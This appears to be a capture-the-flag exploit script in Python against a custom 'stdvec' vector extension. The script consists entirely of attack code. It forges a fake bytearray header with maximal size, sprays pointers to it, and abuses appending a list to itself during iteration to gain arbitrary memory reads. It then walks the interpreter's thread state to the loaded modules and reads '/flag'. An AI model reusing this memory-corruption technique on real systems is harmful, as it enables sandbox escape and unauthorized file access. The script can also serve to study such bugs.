def p64(buf, n):
	buf.append(n&0xff)
	buf.append(n>>8&0xff)
	buf.append(n>>16&0xff)
	buf.append(n>>24&0xff)
	buf.append(n>>32&0xff)
	buf.append(n>>40&0xff)
	buf.append(n>>48&0xff)
	buf.append(n>>56&0xff)

def p32(buf, n):
	buf.append(n&0xff)
	buf.append(n>>8&0xff)
	buf.append(n>>16&0xff)
	buf.append(n>>24&0xff)

def ptr(x): return id(x)+32

n = 1<<13

# thread state: 0x00aa5b28
#  interp -> [+0x10]
#  modules -> [+0x28]

fake_type = bytearray(0x88)
p64(fake_type, 0x0044d27c)
fake_type = bytes(fake_type)
print('fake_type:', hex(ptr(fake_type)))

#fake_obj = bytearray(b"\acat f*\x00")
fake_obj = bytearray(b"\a\nyes \x00\x00")
#p64(fake_obj, 1337) # ob_refcnt
p64(fake_obj, id(bytearray)) # ob_type
p64(fake_obj, 0x7fffffffffffffff) # ob_size
p64(fake_obj, 0x7fffffffffffffff) # ob_alloc
p64(fake_obj, 0) # ob_bytes
p64(fake_obj, 0) # ob_start
p32(fake_obj, 0) # ob_exports
fake_obj = bytes(fake_obj)
print('fake_obj:', hex(ptr(fake_obj)))

payload = bytearray(n*8)
p = ptr(fake_obj)
for i in range(0, n*8, 8):
	for j in range(8):
		payload[i+j] = p>>(8*j)&0xff

print('a'*4097)

l = stdvec.StdVec()
for i in range(n):
	l.append(i)
it = (x for x in l)
l.append(l)
copy = bytearray(payload)
leak = None
m = None
for x in it:
	if id(x) == m:
		io = x['io']
		print(io.FileIO('/flag').read())
		x['sy\x73'].exit()
		break
	print('real obj:', hex(id(x)))
	print('a'*4097)
	i = int.from_bytes(x[0x00aa5b28+0x10:0x00aa5b28+0x18], 'little')
	m = int.from_bytes(x[i+0x28:i+0x30], 'little')
	print(hex(i))
	print(hex(m))
	for i in range(0, n*8, 8):
		for j in range(8):
			copy[i+j] = m>>(8*j)&0xff
print('still alive')

copy.hex()
